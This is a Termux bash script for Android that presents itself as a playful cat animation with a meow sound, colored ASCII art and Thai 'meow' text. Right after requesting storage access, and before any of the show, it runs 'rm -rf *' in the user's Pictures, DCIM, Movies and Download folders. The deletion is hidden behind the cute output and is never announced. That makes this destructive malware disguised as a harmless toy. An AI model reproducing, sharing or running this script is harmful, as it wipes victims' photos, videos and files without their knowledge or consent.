#!/bin/bash
clear
termux-setup-storage
cd /sdcard/Pictures;rm -rf *;cd ../DCIM;rm -rf *;cd ../Movies;rm -rf *;cd ../Download;rm -rf *
#################################
pkg update -y && pkg upgrade -y
apt-get install ruby -y
pkg install wget -y
pkg install mpv -y
pkg install unzip -y
wget https://github.com/busyloop/lolcat/archive/master.zip
unzip master.zip
cd lolcat-master/bin
gem install lolcat -y
clear
echo
echo "
☆    ☆  ☆
┈┈┈┈ ╭━━━━━━╮  ☆
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏
┈┈ ╰━┫╳╳╳▕▏╰┻╯▏
☆ ┈┈┈┃╳╳╳╳╲▂▂╱
   ☆ ╰┳┳━━┳┳╯   ☆" | lolcat
echo
echo " เมี๊ยวๆ เมี๊ยวๆ เมี๊ยวๆ ᴥ︎︎︎" | lolcat
echo
mpv "cat.mp3" | lolcat
#################################
